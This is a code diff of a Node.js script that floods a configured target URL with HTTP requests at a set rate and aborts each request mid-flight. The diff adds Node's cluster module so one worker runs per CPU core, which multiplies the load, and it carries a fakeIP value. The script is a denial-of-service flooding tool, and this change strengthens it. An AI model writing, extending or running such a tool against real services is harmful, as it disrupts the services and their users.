@@ -1,4 +1,25 @@
+const cluster = require("cluster")
 const fs = require("fs");
+
+let sentCount = 0;
+let totalCount = 0;
+
+function printLog(){
+    process.stdout.write(`\rProgress: ${sentCount}/${totalCount}`);
+}
+
+const parallelLength = require("os").cpus().length
+
+if(cluster.isPrimary){
+    for(let i = 0; i < parallelLength; i++){
+        cluster.fork();
+    }
+}else{
+    mainWrapper();
+}
+
+//main-func
+function mainWrapper(){
 
 const fakeIP = "203.0.113.50"
 
@@ -21,6 +42,7 @@ fs.readFile("./config.json", 'utf-8', (err, data) => {
     setdata.rate = parseInt(tempstore.rate);
     setdata.total = parseInt(tempstore.total);
     setdata.warn = tempstore.warn;
+    totalCount = parseInt(tempstore.total)
     main();
 });
 
@@ -34,7 +56,7 @@ async function main() {
     console.log(`Starting execution: Target total of ${setdata.total} requests.`);
 
     // Batching logic overcomes setTimeout latency limitations for high RPS
-    let sentCount = 0;
+    
     const intervalMs = 50; // Fire in chunks every 50ms to keep timing accurate
     const chunkFactor = setdata.rate * (intervalMs / 1000);
 
@@ -48,7 +70,6 @@ async function main() {
 
             sendAndAbortMidFlight(setdata.targeturl);
             sentCount++;
-            process.stdout.write(`\rProgress: ${sentCount}/${setdata.total}`);
         }
     }, intervalMs);
 }
@@ -78,4 +99,5 @@ function sendAndAbortMidFlight(url) {
     setImmediate(() => {
         controller.abort();
     });
+}
 }
